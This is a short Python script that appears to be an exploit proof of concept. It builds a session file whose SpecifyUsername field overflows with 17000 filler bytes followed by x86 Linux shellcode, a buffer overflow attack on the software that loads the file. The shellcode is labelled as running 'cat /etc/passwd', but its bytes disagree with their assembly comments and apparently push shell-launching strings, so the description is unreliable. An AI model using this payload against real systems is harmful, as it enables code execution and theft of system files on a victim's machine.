#!/usr/bin/env python

# Linux x86 shellcode to execute "cat /etc/passwd"
shellcode = (
    "\x6a\x0b"          # push $0xb
    "\x58"              # pop %eax
    "\x99"              # cdq
    "\x52"              # push %edx
    "\x66\x68\x2d\x70"  # push $0x702d
    "\x89\xe1"          # mov %esp,%ecx
    "\x52"              # push %edx
    "\x6a\x68"          # push $0x68
    "\x68\x2f\x62\x69"  # push $0x69622f2f
    "\x6e\x89\xe3"      # mov %esp,%ebx
    "\x52"              # push %edx
    "\x51"              # push %ecx
    "\x53"              # push %ebx
    "\x89\xe1"          # mov %esp,%ecx
    "\xcd\x80"          # int $0x80
)

sessions_file = "[Bookmarks]\n"
sessions_file += "SpecifyUsername=" + "A"*17000 + "B"*4 + "C"*4 + "D"*4 + shellcode
